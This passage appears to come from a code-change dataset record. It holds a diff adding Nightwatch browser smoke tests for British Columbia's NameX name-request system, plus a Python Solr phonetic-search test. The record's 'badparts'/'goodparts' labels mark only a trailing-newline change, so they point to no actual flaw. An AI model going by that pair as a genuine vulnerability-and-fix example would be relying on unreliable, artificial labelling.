Insurance',\r\n+\r\n+    historyExample : 'GITSELASU FLORISTS LIMITED'\r\n+};\n\\ No newline at end of file\ndiff --git a/e2e/nightwatch.json b/e2e/nightwatch.json\nnew file mode 100644\nindex 00000000..cbab6ff0\n--- /dev/null\n+++ b/e2e/nightwatch.json\n@@ -0,0 +1,38 @@\n+{\r\n+\t\"src_folders\": [\"./specs\"],\r\n+\t\"output_folder\": \"./reports\",\r\n+\t\"custom_commands_path\": \"./custom-commands\",\r\n+\t\"page_objects_path\": \"./page-objects\",\r\n+\t\"globals_path\": \"globals.js\",\r\n+\r\n+\t\"webdriver\": {\r\n+\t\t\"start_process\": true,\r\n+\t\t\"server_path\": \"./node_modules/chromedriver/lib/chromedriver/chromedriver\",\r\n+\t\t\"port\": 9515,\r\n+\t\t\"cli_args\": []\r\n+\t},\r\n+\t\"test_settings\": {\r\n+\t\t\"default\": {\r\n+\t\t\t\"globals\": {\r\n+\t\t\t\t\"NROPath\": \"https://test.bcregistrynames.gov.bc.ca\",\r\n+\t\t\t\t\"NamexPath\": \"https://namex-test.pathfinder.gov.bc.ca\"\r\n+\t\t\t},\r\n+\r\n+\t\t\t\"desiredCapabilities\": {\r\n+\t\t\t\t\"browserName\": \"chrome\",\r\n+\t\t\t\t\"javascriptEnabled\": true,\r\n+\t\t\t\t\"acceptSslCerts\": true,\r\n+\t\t\t\t\"acceptInsecureCerts\": true,\r\n+\t\t\t\t\"chromeOptions\": {\r\n+\t\t\t\t\t\"args\": [\r\n+\t\t\t\t\t\t\"disable-gpu\",\r\n+\t\t\t\t\t\t\"no-sandbox\",\r\n+\t\t\t\t\t\t\"headless\",\r\n+\t\t\t\t\t\t\"ignore-certificate-errors\",\r\n+\t\t\t\t\t\t\"window-size=1920,1080\"\r\n+\t\t\t\t\t]\r\n+\t\t\t\t}\r\n+\t\t\t}\r\n+\t\t}\r\n+\t}\r\n+}\r\ndiff --git a/e2e/package.json b/e2e/package.json\nnew file mode 100644\nindex 00000000..35c77cab\n--- /dev/null\n+++ b/e2e/package.json\n@@ -0,0 +1,14 @@\n+{\n+  \"name\": \"e2e\",\n+  \"version\": \"1.0.0\",\n+  \"description\": \"\",\n+  \"scripts\": {\n+    \"test\": \"./node_modules/nightwatch/bin/nightwatch -t ./specs/namex-smoke-test\"\n+  },\n+  \"dependencies\": {\n+    \"nightwatch\": \"1.0.19\",\n+    \"geckodriver\": \"latest\",\n+    \"chromedriver\": \"2.46\",\n+    \"request\": \"^2.88.0\"\n+  }\n+}\ndiff --git a/e2e/page-objects/namexExamination.js b/e2e/page-objects/namexExamination.js\nnew file mode 100644\nindex 00000000..a18d255f\n--- /dev/null\n+++ b/e2e/page-objects/namexExamination.js\n@@ -0,0 +1,105 @@\n+var examineCommands = {\r\n+\tclickThenWaitForSolrSearch: function (elementToClick, browser) {\r\n+\t\treturn this.waitForElementNotVisible('#loading-overlay')\r\n+\t\t\t.waitForXHR('@slowest_solr_search_XHR', 5000, function browserTrigger() {\r\n+\t\t\t\tbrowser.click(elementToClick);\r\n+\t\t\t}, function testCallback(xhrs) {\r\n+\t\t\t\tbrowser.assert.equal(xhrs[0].status, \"success\");\r\n+\t\t\t\tbrowser.assert.equal(xhrs[0].httpResponseCode, 200);\r\n+\t\t\t});\r\n+\t},\r\n+\tloadNRandWait: function (NR_num, browser) {\r\n+\t\treturn this.waitForElementVisible('@header_load_NR_textbox')\r\n+\t\t\t.setValue('@header_load_NR_textbox', NR_num)\r\n+\t\t\t.clickThenWaitForSolrSearch(this.elements.header_load_NR_button.selector, browser);\r\n+\r\n+\t},\r\n+\tloadNRnoWait: function (NR_num) {\r\n+\t\treturn this.waitForElementVisible('@header_load_NR_textbox')\r\n+\t\t\t.setValue('@header_load_NR_textbox', NR_num)\r\n+\t\t\t.waitForElementNotVisible('#loading-overlay')\r\n+\t\t\t.click('@header_load_NR_button');\r\n+\t},\r\n+\teditNR: function () {\r\n+\t\treturn this.setValue('@edit_name_choice_1', ' EDIT')\r\n+\t\t\t.setValue('@edit_address_line_1', ' EDIT');\r\n+\t},\r\n+\tcompleteManualSearch: function (searchTerm, browser) {\r\n+\t\treturn this\r\n+\t\t\t.clearValue('@manual_search_box')\r\n+\t\t\t.setValue('@manual_search_box', searchTerm)\r\n+\t\t\t.clickThenWaitForSolrSearch(this.elements.manual_search_button.selector, browser);\r\n+\r\n+\t},\r\n+\tdismissModal: function () {\r\n+\t\t//Shouldn't be needed once test data is well set up\r\n+\t\treturn this\r\n+\t\t\t.waitForElementVisible('#error-message-modal > div > div')\r\n+\t\t\t.assert.cssClassPresent('body', 'modal-open')\r\n+\t\t\t.assert.cssClassPresent('#error-message-modal', 'modal')\r\n+\t\t\t.assert.cssClassPresent('#error-message-modal', 'fade')\r\n+\t\t\t.assert.cssClassPresent('#error-message-modal', 'show')\r\n+\t\t\t.assert.attributeContains('#error-message-modal', 'style', 'display: block;')\r\n+\t\t\t.waitForElementVisible('#error-message-modal > div > div > div.modal-footer > button')\r\n+\t\t\t.click('#error-message-modal > div > div > div.modal-footer > button')\r\n+\t\t\t.waitForElementNotVisible('#error-message-modal')\r\n+\t\t\t.assert.cssClassNotPresent('body', 'modal-open');\r\n+\t},\r\n+\tbeginExamining: function () {\r\n+\t\treturn this\r\n+\t\t\t.click('@examine_button')\r\n+\t\t\t.waitForElementVisible('@decision_button')\r\n+\t},\r\n+\tcancelNR: function () {\r\n+\t\treturn this\r\n+\t\t\t.waitForElementVisible('@cancel_button')\r\n+\t\t\t.click('@cancel_button')\r\n+\t\t\t.waitForElementVisible('@cancel_comment')\r\n+\t\t\t.setValue('@cancel_comment', 'TEST CANCEL TEST CANCEL')\r\n+\t\t\t.click('@confirm_cancel_button');\r\n+\t}\r\n+\r\n+};\r\n+\r\n+module.exports = {\r\n+\tcommands: [examineCommands],\r\n+\telements: {\r\n+\t\theader_load_NR_textbox: '#header-search-input',\r\n+\t\theader_load_NR_button: '#header-search-button',\r\n+\r\n+\t\tslowest_solr_search_XHR: 'https://namex-test.pathfinder.gov.bc.ca/api/v1/documents:histories',\r\n+\t\trequests_XHR: 'https://namex-test.pathfinder.gov.bc.ca/api/v1/requests',\r\n+\r\n+\t\tedit_button: '#nr-details-edit-button',\r\n+\t\tedit_save_button: '#nr-details-save-button',\r\n+\t\tedit_name_choice_1: '#div2 > div:nth-child(2) > div > table > tr:nth-child(1) > td:nth-child(2) > input',\r\n+\t\tedit_address_line_1: '#div3 > div.row.add-bottom-padding-extra > div > div.row.add-bottom-padding > div > span > span > input:nth-child(5)',\r\n+\r\n+\t\tname_choice_1: '#name1',\r\n+\t\tcurrent_NR: 'div.nrNum',\r\n+\r\n+\t\tconflicts_recipe_step: '#conflicts-tab',\r\n+\t\tcondition_recipe_step: '#conditions-tab',\r\n+\t\ttrademark_recipe_step: '#trademarks-tab',\r\n+\t\thistory_recipe_step: '#history-tab',\r\n+\r\n+\t\tmanual_search_box: '#manual-search > form > div > input',\r\n+\t\tmanual_search_button: '.btn-search',\r\n+\r\n+\t\texact_match_result: '#conflict-list > div.conflict-result.conflict-exact-match > div',\r\n+\t\tcondition_result: '#conditions-wrapper > div > div.-complex-table > div.-table-body > div > table > tbody > tr > td:nth-child(1)',\r\n+\t\ttrademark_result: '#trademarks-wrapper > p > div > div:nth-child(2) > table > tbody > tr:nth-child(1) > td:nth-child(1)',\r\n+\t\thistory_result: 'div.row.history-list-view > select > option',\r\n+\r\n+\t\tconflict_details_corp_name: '#currentConflictName',\r\n+\r\n+\t\texamine_button: '#examine-button',\r\n+\t\tdecision_button: '#examine-decide-button',\r\n+\t\treject_distinctive_button: '#examine-reject-distinctive-button',\r\n+\t\treopen_button: '#examine-re-open-button',\r\n+\r\n+\t\tcancel_button: '#examine-cancel-button',\r\n+\t\tcancel_comment: '#cancel-comment-text',\r\n+\t\tconfirm_cancel_button: '#cancel-nr-after-comment-button'\r\n+\t}\r\n+};\n\\ No newline at end of file\ndiff --git a/e2e/page-objects/namexLanding.js b/e2e/page-objects/namexLanding.js\nnew file mode 100644\nindex 00000000..b9a5ef02\n--- /dev/null\n+++ b/e2e/page-objects/namexLanding.js\n@@ -0,0 +1,34 @@\n+var loginCommands = {\r\n+\r\n+\tlogin: function () {\r\n+\t\treturn this.waitForElementNotVisible('@loading_overlay')\r\n+\t\t\t.waitForElementVisible('@login_button')\r\n+\t\t\t.click('@login_button');\r\n+\r\n+\t},\r\n+\tcheckIfLandingPageIsUp: function () {\r\n+\t\treturn this.waitForElementVisible('@app_container')\r\n+\t\t\t.assert.containsText('@missing_auth_h2', 'Your authorization is missing or has expired. Please login.')\r\n+\t}\r\n+};\r\n+\r\n+module.exports = {\r\n+\tcommands: [loginCommands],\r\n+\turl: function () {\r\n+\t\treturn this.api.globals.NamexPath;\r\n+\t},\r\n+\telements: {\r\n+\t\tmissing_auth_h2: 'h2',\r\n+\t\tlogin_button: '#header-login-button',\r\n+\t\tidir_button: '#zocial-idir',\r\n+\t\tloading_overlay: '#loading-overlay',\r\n+\t\tsiteminder_user: '#user',\r\n+\t\tsiteminder_pw: '#password',\r\n+\t\tsiteminder_continue_button: 'input[value=\"Continue\"]',\r\n+\t\tapp_container: '#app',\r\n+\t\tkeycloak_logo: '#kc-logo-wrapper',\r\n+\t\tkeycloak_username: '#username',\r\n+\t\tkeycloak_password: '#password',\r\n+\t\tkeycloak_login_button: '#kc-login'\r\n+\t}\r\n+};\n\\ No newline at end of file\ndiff --git a/e2e/page-objects/namexSearch.js b/e2e/page-objects/namexSearch.js\nnew file mode 100644\nindex 00000000..d213d061\n--- /dev/null\n+++ b/e2e/page-objects/namexSearch.js\n@@ -0,0 +1,52 @@\n+var searchCommands = {\r\n+    navigateToSearchPage: function () {\r\n+        return this.waitForElementVisible('@header_search_link')\r\n+            .click('@header_search_link');\r\n+\r\n+    },\r\n+    searchNR: function (NR_num, browser) {\r\n+        var NRColumnValue;\r\n+        browser.expect.element(this.elements.loading_overlay.selector).to.have.css('display').which.equals('none').before(5000);\r\n+\r\n+        this.waitForElementVisible('@NR_column')\r\n+            .getValue('@NR_column', function (result) {\r\n+                NRColumnValue = result.value;\r\n+            })\r\n+            .perform(function () {\r\n+                if (NRColumnValue != NR_num) {\r\n+                    browser.setValue('#search-filter-nr-number', NR_num);\r\n+                }\r\n+\r\n+            })\r\n+            .setValue('@status_column', 'ALL');\r\n+\r\n+        browser.expect.element(this.elements.loading_overlay.selector).to.have.css('display').which.equals('none').before(5000);\r\n+        browser.expect.element(this.elements.NR_column.selector).value.to.equal(NR_num).before(5000);\r\n+        browser.expect.element(this.elements.status_column.selector).value.to.equal('ALL').before(5000);\r\n+\r\n+        this.click('@NR_column');\r\n+        return this.waitForXHR('@search_XHR', 1000, function browserTrigger() {\r\n+            browser.keys(browser.Keys.ENTER);\r\n+        }, function testCallback(xhrs) {\r\n+            browser.assert.equal(xhrs[0].status, \"success\");\r\n+            browser.assert.equal(xhrs[0].httpResponseCode, 200);\r\n+        });\r\n+\r\n+    },\r\n+    waitForExtractorUpdater: function () {\r\n+        return this.pause(180000);\r\n+    }\r\n+};\r\n+\r\n+module.exports = {\r\n+    commands: [searchCommands],\r\n+    elements: {\r\n+        header_search_link: '#header-search-link',\r\n+        loading_overlay: '#loading-overlay',\r\n+        status_column: '#search-filter-state',\r\n+        NR_column: '#search-filter-nr-number',\r\n+        first_row_result_NR: '#search-table > tbody > tr:nth-child(1) > td.text-center.link > a',\r\n+        first_row_result_notification: '#search-table > tbody > tr > td:nth-child(7)',\r\n+        search_XHR: 'https://namex-test.pathfinder.gov.bc.ca/api/v1/requests'\r\n+    }\r\n+};\n\\ No newline at end of file\ndiff --git a/e2e/specs/namex-smoke-test.js b/e2e/specs/namex-smoke-test.js\nnew file mode 100644\nindex 00000000..a1e645f1\n--- /dev/null\n+++ b/e2e/specs/namex-smoke-test.js\n@@ -0,0 +1,289 @@\n+module.exports = {\r\n+    before: function (browser) {\r\n+        var options = {\r\n+            method: 'POST',\r\n+            uri: browser.globals.keycloakAuthURL,\r\n+            body: browser.globals.keycloakAuthBody,\r\n+            headers: {\r\n+                'Content-Type': 'application/x-www-form-urlencoded'\r\n+            },\r\n+        };\r\n+\r\n+        browser.apiPost(options, function (response) {\r\n+            var jsonResp = response.toJSON();\r\n+            var access_token = JSON.parse(jsonResp.body);\r\n+            browser.globals.token = access_token.access_token;\r\n+        });\r\n+\r\n+\r\n+\r\n+        browser\r\n+            .url(browser.globals.NamexPath, function () {\r\n+                var cookie = {\r\n+                    'name': 'tester',\r\n+                    'value': browser.globals.token\r\n+                };\r\n+                browser.setCookie(cookie);\r\n+\r\n+            });\r\n+    },\r\n+\r\n+    'Step 1: Navigate to public NRO': function (browser) {\r\n+        browser\r\n+            .url(browser.globals.NROPath)\r\n+            .maximizeWindow()\r\n+            .waitForElementVisible('img[src=\"images/step3.gif\"]')\r\n+            .click('img[src=\"images/step3.gif\"]')\r\n+            .waitForElementVisible('input[name=\"_eventId_next\"]')\r\n+            .click('input[name=\"_eventId_next\"]');\r\n+\r\n+    },\r\n+\r\n+    'Step 2: NRO - Applicant Info': function (browser) {\r\n+        browser\r\n+            .waitForElementVisible('input[name=\"lastName\"]')\r\n+            .setValue('input[name=\"lastName\"]', 'TEST')\r\n+            .setValue('input[name=\"firstName\"]', 'TEST')\r\n+            .click('#notifyMethod2')\r\n+            .setValue('input[name=\"address1\"]', 'TEST 940 Blanshard Street')\r\n+            .setValue('input[name=\"city\"]', 'TEST Victoria')\r\n+            .setValue('input[name=\"postalCode\"]', 'V8W 2H3')\r\n+            .setValue('input[name=\"phoneNum\"]', '5555555555')\r\n+            .click('img[alt=\"Next\"]');\r\n+    },\r\n+\r\n+    'Step 3: NRO - Select NR Type': function (browser) {\r\n+        browser\r\n+            .waitForElementVisible('#requestType1')\r\n+            .click('#requestType1')\r\n+            .click('img[alt=\"Next\"]');\r\n+    },\r\n+\r\n+    'Step 4: NRO - Enter Name Choices': function (browser) {\r\n+        browser\r\n+            .waitForElementVisible('input[name=\"nameOneText\"]')\r\n+            .setValue('input[name=\"nameOneText\"]', 'ZZZZZZZ 1 TEST NAME DO NOT EXAMINE')\r\n+            .setValue('input[name=\"nameTwoText\"]', 'ZZZZZZZ 2 TEST NAME DO NOT EXAMINE')\r\n+            .setValue('input[name=\"nameThreeText\"]', 'ZZZZZZZ 3 TEST NAME DO NOT EXAMINE')\r\n+            .setValue('#natureOfBusiness', 'TEST TEST TEST TEST TEST TEST TEST TEST TEST TEST ')\r\n+            .setValue('#additionalInformation', 'TEST TEST TEST TEST TEST TEST TEST TEST TEST TEST ')\r\n+            .click('img[alt=\"Next\"]');\r\n+    },\r\n+\r\n+    'Step 5: NRO - Confirmation Screen': function (browser) {\r\n+        browser\r\n+            .waitForElementVisible('input[name=\"cardHolderName\"]')\r\n+            .setValue('input[name=\"cardHolderName\"]', 'TEST')\r\n+            .setValue('input[name=\"phoneNumber\"]', '5555555555')\r\n+            .click('#agree1')\r\n+            .click('#publicPay');\r\n+    },\r\n+\r\n+    'Step 6: NRO - Beanstream CC page': function (browser) {\r\n+        browser\r\n+            .waitForElementVisible('input[name=\"trnCardNumber\"]')\r\n+            .setValue('input[name=\"trnCardNumber\"]', browser.globals.TestCC)\r\n+            .setValue('input[name=\"trnCardCvd\"]', browser.globals.TestCVD)\r\n+            .click('input[name=\"submitButton\"]');\r\n+    },\r\n+\r\n+    'Step 6: NRO - Receipt Screen': function (browser) {\r\n+        browser.waitForElementVisible('#content');\r\n+        browser.getText(\"#command > table > tbody > tr:nth-child(7) > td > strong\", function (result) {\r\n+            browser.globals.smokeTestNR.NR_num = result.value;\r\n+        });\r\n+    },\r\n+\r\n+    'Step 7: Navigate to NameX landing page then log in': function (browser) {\r\n+        var options = {\r\n+            method: 'POST',\r\n+            uri: browser.globals.keycloakAuthURL,\r\n+            body: browser.globals.keycloakAuthBody,\r\n+            headers: {\r\n+                'Content-Type': 'application/x-www-form-urlencoded'\r\n+            },\r\n+        };\r\n+\r\n+        browser.apiPost(options, function (response) {\r\n+            var jsonResp = response.toJSON();\r\n+            var access_token = JSON.parse(jsonResp.body);\r\n+            browser.globals.token = access_token.access_token;\r\n+        });\r\n+\r\n+        browser\r\n+            .url(browser.globals.keycloakAuthURL, function () {\r\n+                var cookie = {\r\n+                    'name': 'KEYCLOAK_IDENTITY',\r\n+                    'value': browser.globals.token\r\n+                };\r\n+                browser.setCookie(cookie);\r\n+\r\n+            })\r\n+            .url(browser.globals.NamexPath)\r\n+            .click('#header-login-button');\r\n+    },\r\n+\r\n+    'Step 8:  NameX - wait for extractor to run': function (browser) {\r\n+        var searchPage = browser.page.namexSearch();\r\n+\r\n+        searchPage\r\n+            .navigateToSearchPage()\r\n+            .searchNR(browser.globals.smokeTestNR.NR_num, browser)\r\n+            .waitForAttribute('#search-table > tbody > tr', 'class', function (result) {\r\n+                return result !== 'b-table-empty-row';\r\n+            }, 360000);\r\n+    },\r\n+\r\n+    'Step 9:  NameX - Load NR': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .loadNRandWait(browser.globals.smokeTestNR.NR_num, browser)\r\n+            .assert.containsText('@name_choice_1', browser.globals.smokeTestNR.name_choice1)\r\n+            .assert.containsText('@current_NR', browser.globals.smokeTestNR.NR_num);\r\n+    },\r\n+\r\n+    'Step 10:  NameX - Edit NR': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .waitForElementVisible('@edit_button')\r\n+            .waitForXHR('https://namex-test.pathfinder.gov.bc.ca/api/v1/requests', 5000, function browserTrigger() {\r\n+                browser.click('#nr-details-edit-button');\r\n+            }, function testCallback(xhrs) {\r\n+                browser.assert.equal(xhrs[0].method, \"PATCH\");\r\n+                browser.assert.equal(xhrs[0].status, \"success\");\r\n+                browser.assert.equal(xhrs[0].httpResponseCode, 200);\r\n+                browser.assert.equal(xhrs[1].method, \"GET\");\r\n+                browser.assert.equal(xhrs[1].status, \"success\");\r\n+                browser.assert.equal(xhrs[1].httpResponseCode, 200);\r\n+            });\r\n+\r\n+        browser.expect.element('#firstName1').to.have.css('background-color').which.equals('rgba(255, 255, 255, 1)');\r\n+\r\n+        examinePage\r\n+            .editNR()\r\n+            .clickThenWaitForSolrSearch('#nr-details-save-button', browser)\r\n+            .click('@conflicts_recipe_step');\r\n+    },\r\n+\r\n+    'Step 11:  NameX - Enter exact match and check corp details pane': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .completeManualSearch(browser.globals.exactMatch, browser)\r\n+            .assert.containsText('@exact_match_result', browser.globals.exactMatch)\r\n+            .assert.containsText('@conflict_details_corp_name', browser.globals.exactMatch);\r\n+    },\r\n+\r\n+    'Step 12:  NameX - Check Condition Recipe Step': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage.completeManualSearch(browser.globals.conditionExample, browser)\r\n+            .click('@condition_recipe_step')\r\n+            .waitForElementVisible('@condition_result')\r\n+            .assert.containsText('@condition_result', browser.globals.conditionExample);\r\n+    },\r\n+\r\n+    'Step 13:  NameX - Check Trademarks Recipe Step': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+        examinePage\r\n+            .click('@trademark_recipe_step')\r\n+            .waitForElementVisible('@trademark_result')\r\n+            .assert.containsText('@trademark_result', browser.globals.trademarkResult);\r\n+    },\r\n+\r\n+    'Step 14:  NameX - Check History Recipe Step': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .completeManualSearch(browser.globals.historyExample, browser)\r\n+            .click('@history_recipe_step')\r\n+            .waitForElementVisible('@history_result')\r\n+            .assert.containsText('@history_result', browser.globals.historyExample);\r\n+    },\r\n+\r\n+    'Step 15: NameX - Reject all 3 names': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .click('@conflicts_recipe_step')\r\n+            .beginExamining()\r\n+            .clickThenWaitForSolrSearch('#examine-reject-distinctive-button', browser)\r\n+            .waitForElementVisible('@decision_button')\r\n+            .clickThenWaitForSolrSearch('#examine-reject-distinctive-button', browser)\r\n+            .waitForElementVisible('@decision_button')\r\n+            .click('@reject_distinctive_button')\r\n+            .waitForElementVisible('@reopen_button');\r\n+    },\r\n+\r\n+    'Step 16: NameX - Confirm Client Notification is complete': function (browser) {\r\n+        var searchPage = browser.page.namexSearch();\r\n+\r\n+        searchPage\r\n+            .navigateToSearchPage()\r\n+            .searchNR(browser.globals.smokeTestNR.NR_num, browser)\r\n+            .waitForText('#search-table > tbody > tr > td:nth-child(7)', function (result) {\r\n+                return result === 'Notified';\r\n+            },360000)\r\n+            .assert.containsText('@first_row_result_NR', browser.globals.smokeTestNR.NR_num)\r\n+            .assert.containsText('@first_row_result_notification', 'Notified');\r\n+    },\r\n+\r\n+    'Step 17: NRO - Check all updates complete': function (browser) {\r\n+        browser\r\n+            .url(browser.globals.NROPath)\r\n+            .maximizeWindow()\r\n+            .waitForElementVisible('img[src=\"images/step4.gif\"]')\r\n+            .click('img[src=\"images/step4.gif\"]')\r\n+            .waitForElementVisible('#nameRequestNum')\r\n+            .setValue('#nameRequestNum', browser.globals.smokeTestNR.NR_num)\r\n+            .setValue('#contactNumber', '5555555555')\r\n+            .click('img[alt=\"Get Name Request\"]')\r\n+            .waitForElementVisible('#monitorStatusAnon');\r\n+\r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(9) > td > h3').text.to.contain(browser.globals.smokeTestNR.NR_num);\r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(15) > td:nth-child(2)').text.to.contain('EDIT');\r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(14) > td:nth-child(2)').text.to.contain('Rejected');\r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(20) > td:nth-child(2)').text.to.contain('Rejected');\r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(26) > td:nth-child(2)').text.to.contain('Rejected');\r\n+    },\r\n+\r\n+    'Step 18: Namex - log back into NameX': function (browser) {\r\n+        //var examinePage = browser.page.namexExamination();\r\n+\r\n+        browser.url(browser.globals.NamexPath);\r\n+        browser.maximizeWindow();\r\n+        browser\r\n+            .click('#header-login-button')\r\n+            .waitForElementVisible('#header-search-input');\r\n+    },\r\n+\r\n+    'Step 19: NameX - Cancel NR': function (browser) {\r\n+        var examinePage = browser.page.namexExamination();\r\n+\r\n+        examinePage\r\n+            .loadNRnoWait(browser.globals.smokeTestNR.NR_num)\r\n+            .waitForElementVisible('@current_NR')\r\n+            .assert.containsText('@current_NR', browser.globals.smokeTestNR.NR_num)\r\n+            .cancelNR();\r\n+    },\r\n+    'Step 20: NRO - Confirm Cancel is complete': function (browser) {\r\n+        browser\r\n+            .url(browser.globals.NROPath)\r\n+            .maximizeWindow()\r\n+            .waitForElementVisible('img[src=\"images/step4.gif\"]')\r\n+            .click('img[src=\"images/step4.gif\"]')\r\n+            .waitForElementVisible('#nameRequestNum')\r\n+            .setValue('#nameRequestNum', browser.globals.smokeTestNR.NR_num)\r\n+            .setValue('#contactNumber', '5555555555')\r\n+            .click('img[alt=\"Get Name Request\"]')\r\n+            .waitForElementVisible('#monitorStatusAnon');\r\n+            \r\n+        browser.expect.element('#monitorStatusAnon > table > tbody > tr:nth-child(11) > td:nth-child(2) > h3').text.to.contain('Cancelled');\r\n+\r\n+        browser.end();\r\n+\r\n+    }\r\n+\r\n+};\n\\ No newline at end of file\n", "files": {"/api/tests/python/end_points/test_sounds_like.py": {"changes": [{"diff": "\n     verify_results(client, jwt,\n         query=query,\n         expected=[{'name':'----*'}]\n-    )\n+    )\n\\ No newline at end of file", "add": 1, "remove": 1, "filename": "/api/tests/python/end_points/test_sounds_like.py", "badparts": ["    )"], "goodparts": ["    )"]}], "source": "\nfrom namex.models import User import requests import json import pytest from tests.python import integration_solr, integration_synonym_api import urllib from hamcrest import * token_header={ \"alg\": \"RS256\", \"typ\": \"JWT\", \"kid\": \"flask-jwt-oidc-test-client\" } claims={ \"iss\": \"https://sso-dev.pathfinder.gov.bc.ca/auth/realms/sbc\", \"sub\": \"43e6a245-0bf7-4ccf-9bd0-e7fb85fd18cc\", \"aud\": \"NameX-Dev\", \"exp\": 31531718745, \"iat\": 1531718745, \"jti\": \"flask-jwt-oidc-test-support\", \"typ\": \"Bearer\", \"username\": \"test-user\", \"realm_access\":{ \"roles\":[ \"{}\".format(User.EDITOR), \"{}\".format(User.APPROVER), \"viewer\", \"user\" ] } } @pytest.fixture(scope=\"session\", autouse=True) def reload_schema(solr): url=solr +'/solr/admin/cores?action=RELOAD&core=possible.conflicts&wt=json' r=requests.get(url) assert r.status_code==200 @integration_solr def test_solr_available(solr, app, client, jwt): url=solr +'/solr/possible.conflicts/admin/ping' r=requests.get(url) assert r.status_code==200 def clean_database(solr): url=solr +'/solr/possible.conflicts/update?commit=true' headers={'content-type': 'text/xml'} data='<delete><query>id:*</query></delete>' r=requests.post(url, headers=headers, data=data) assert r.status_code==200 def seed_database_with(solr, name, id='1', source='CORP'): url=solr +'/solr/possible.conflicts/update?commit=true' headers={'content-type': 'application/json'} data='[{\"source\":\"' +source +'\", \"name\":\"' +name +'\", \"id\":\"'+id +'\"}]' r=requests.post(url, headers=headers, data=data) assert r.status_code==200 def verify(data, expected): print(\"Expected: \", expected) actual=[{ 'name':doc['name_info']['name']} for doc in data['names']] print(\"Actual: \", actual) assert_that(len(actual), equal_to(len(expected))) for i in range(len(actual)): assert_that(actual[i]['name'], equal_to(expected[i]['name'])) def verify_results(client, jwt, query, expected): data=search(client, jwt, query) verify(data, expected) def search(client, jwt, query): token=jwt.create_jwt(claims, token_header) headers={'Authorization': 'Bearer ' +token} url='/api/v1/requests/phonetics/' +urllib.parse.quote(query) +'/*' print(url) rv=client.get(url, headers=headers) assert rv.status_code==200 return json.loads(rv.data) @integration_synonym_api @integration_solr def test_all_good(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'GOLDSTREAM ELECTRICAL LTD') verify_results(client, jwt, query='GOLDSMITHS', expected=[ {'name': '----GOLDSMITHS'}, {'name': 'GOLDSTREAM ELECTRICAL LTD'} ] ) @pytest.mark.skip(reason=\"Rhyming not implemented yet\") @integration_synonym_api @integration_solr def test_sounds_like(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'GAYLEDESIGNS INC.', id='1') seed_database_with(solr, 'GOLDSTREAM ELECTRICAL CORP', id='2') seed_database_with(solr, 'GLADSTONE JEWELLERY LTD', id='3') seed_database_with(solr, 'GOLDSTEIN HOLDINGS INC.', id='4') seed_database_with(solr, 'CLOUDSIDE INN INCORPORATED', id='5') seed_database_with(solr, 'GOLDSPRING PROPERTIES LTD', id='6') seed_database_with(solr, 'GOLDSTRIPES AVIATION INC', id='7') seed_database_with(solr, 'GLADSTONE CAPITAL CORP', id='8') seed_database_with(solr, 'KLETAS LAW CORPORATION', id='9') seed_database_with(solr, 'COLDSTREAM VENTURES INC.', id='10') seed_database_with(solr, 'BLABLA ANYTHING', id='11') verify_results(client, jwt, query='GOLDSMITHS', expected=[ {'name': '----GOLDSMITHS'}, {'name': 'COLDSTREAM VENTURES INC.'}, {'name': 'GOLDSPRING PROPERTIES LTD'}, {'name': 'GOLDSTEIN HOLDINGS INC.'}, {'name': 'GOLDSTREAM ELECTRICAL CORP'}, {'name': 'GOLDSTRIPES AVIATION INC'}, ] ) @integration_synonym_api @integration_solr def test_liberti(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'LIBERTI', id='1') verify_results(client, jwt, query='LIBERTY', expected=[ {'name': '----LIBERTY'}, {'name': 'LIBERTI'}, ] ) @integration_synonym_api @integration_solr def test_deeper(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'LABORATORY', id='1') seed_database_with(solr, 'LAPORTE', id='2') seed_database_with(solr, 'LIBERTI', id='3') verify_results(client, jwt, query='LIBERTY', expected=[ {'name': '----LIBERTY'}, {'name': 'LIBERTI'}, ] ) @integration_synonym_api @integration_solr def test_jasmine(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'JASMINE', id='1') verify_results(client, jwt, query='OSMOND', expected=[ {'name': '----OSMOND'} ] ) @integration_synonym_api @integration_solr def test_fey(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'FEY', id='1') verify_results(client, jwt, query='FAY', expected=[ {'name': '----FAY'}, {'name': 'FEY'} ] ) @integration_synonym_api @integration_solr def test_venizia(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'VENIZIA', id='1') seed_database_with(solr, 'VENEZIA', id='2') seed_database_with(solr, 'VANSEA', id='3') seed_database_with(solr, 'WENSO', id='4') verify_results(client, jwt, query='VENIZIA', expected=[ {'name': '----VENIZIA'}, {'name': 'VENEZIA'}, ] ) @integration_synonym_api @integration_solr def test_ys_and_is(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'CRYSTAL', id='1') verify_results(client, jwt, query='CRISTAL', expected=[ {'name': '----CRISTAL'}, {'name': 'CRYSTAL'}, ] ) @integration_synonym_api @integration_solr def test_cs_and_ks(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KOLDSMITHS', id='1') verify_results(client, jwt, query='COLDSTREAM', expected=[ {'name': '----COLDSTREAM'}, {'name': 'KOLDSMITHS'}, ] ) @integration_synonym_api @integration_solr def test_cs_and_ks_again(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'CRAZY', id='1') seed_database_with(solr, 'KAIZEN', id='2') verify_results(client, jwt, query='CAYZEN', expected=[ {'name': '----CAYZEN'}, {'name': 